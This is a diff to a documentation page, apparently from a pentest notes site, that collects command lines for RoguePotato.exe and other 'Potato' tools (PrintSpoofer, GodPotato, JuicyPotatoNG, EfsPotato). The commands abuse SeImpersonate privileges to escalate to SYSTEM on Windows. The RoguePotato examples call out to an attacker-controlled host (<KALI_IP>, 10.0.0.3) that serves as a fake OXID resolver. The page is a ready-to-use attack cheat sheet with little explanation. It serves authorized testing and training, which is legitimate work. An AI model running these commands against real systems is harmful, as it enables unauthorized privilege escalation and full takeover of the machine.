@@ -9,6 +9,37 @@ hideFooterPagination: true
 
 {/* Generated from Commands/roguepotato.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## RoguePotato.exe: choose the operation and read the result
+
+Commands and examples collected from your RoguePotato.exe notes.
+
+### What the result establishes
+
+Trace the required callback/network path as well as the token and platform prerequisites.
+
+### Prerequisites and common failures
+
+External connection setup and privileged impersonation are separate requirements; a listening port alone proves neither.
+
+### Example 1: A. SeImpersonate / SeAssignPrimaryToken → SYSTEM (Potato)
+
+Run in: **Notebook example**. Saved as written; may include lab values or terminal output.
+
+```cmd
+:: PrintSpoofer (uses the print spooler / RPC)
+.\PrintSpoofer64.exe -i -c cmd.exe
+:: GodPotato (DCOM; very reliable on Server 2016–2022) — pick the .NET version present
+.\GodPotato-NET4.exe -cmd "cmd /c whoami"           :: -> nt authority\system
+:: alternatives if those are blocked:
+.\JuicyPotatoNG.exe -t * -p C:\Windows\System32\cmd.exe -a "/c whoami"
+.\RoguePotato.exe -r <KALI_IP> -e "cmd.exe" -l 9999
+.\EfsPotato.exe "cmd /c whoami"
+```
+
+## Saved commands and notebook recipes
+
+Commands and examples collected from your RoguePotato.exe notes.
+
 [Search this tool’s saved examples](/commands/notebook?tool=roguepotato) · [All tools](/index)
 
 ## A. SeImpersonate / SeAssignPrimaryToken → SYSTEM (Potato)
@@ -25,6 +56,13 @@ hideFooterPagination: true
 .\RoguePotato.exe -r <KALI_IP> -e "cmd.exe" -l 9999
 .\EfsPotato.exe "cmd /c whoami"
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Post-Exploitation: Field Reference — A. SeImpersonate / SeAssignPrimaryToken → SYSTEM (Potato)](/cheatsheets/windows-post-exploitation#a-seimpersonate-/-seassignprimarytoken-→-system-potato)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 Saved as written; may include lab values or terminal output.
 
@@ -57,6 +95,22 @@ RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999
 RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999 -c "{6d8ff8e1-730d-11d4-bf42-00b0d0118b56}" -p splintercode
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — Rogue Potato (Fake OXID Resolver)](/privesc/windows-privesc-checklist#rogue-potato-fake-oxid-resolver) · [socat: Relays and Shell Redirectors — Example 3: Rogue Potato (Fake OXID Resolver)](/tools/socat#example-3-rogue-potato-fake-oxid-resolver)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [Windows Post-Exploitation: Field Reference](/cheatsheets/windows-post-exploitation)
+- [Windows Privilege Escalation: Full Checklist](/privesc/windows-privesc-checklist)
+
+{/* VAULT_RELATED_END */}
